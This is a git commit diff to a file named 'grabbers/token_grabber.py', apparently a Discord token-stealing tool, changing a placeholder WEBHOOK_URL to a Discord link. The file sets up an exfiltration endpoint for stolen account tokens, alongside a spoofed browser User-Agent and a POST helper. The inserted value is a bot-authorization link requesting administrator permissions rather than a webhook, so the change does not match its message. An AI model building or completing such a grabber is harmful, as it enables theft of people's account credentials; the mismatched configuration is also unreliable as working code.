fc142fd25a012e75cbc8da8a6c3a9f0614a41c32
Scripter0811 <jaidtinn140@ed.amdsb.ca>
2026-05-22 14:50:30 -0400

    Update WEBHOOK_URL to a valid Discord URL

--- grabbers/token_grabber.py
+++ grabbers/token_grabber.py
@@ -11,7 +11,7 @@ REQUEST_HEADERS = {
     "Content-Type": "application/json",
     "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
 }
-WEBHOOK_URL = "YOUR WEBHOOK URL"
+WEBHOOK_URL = "https://discord.com/oauth2/authorize?client_id=1507450807753244722&permissions=8&integration_type=0&scope=bot"
 
 
 def make_post_request(api_url: str, data: dict) -> int:
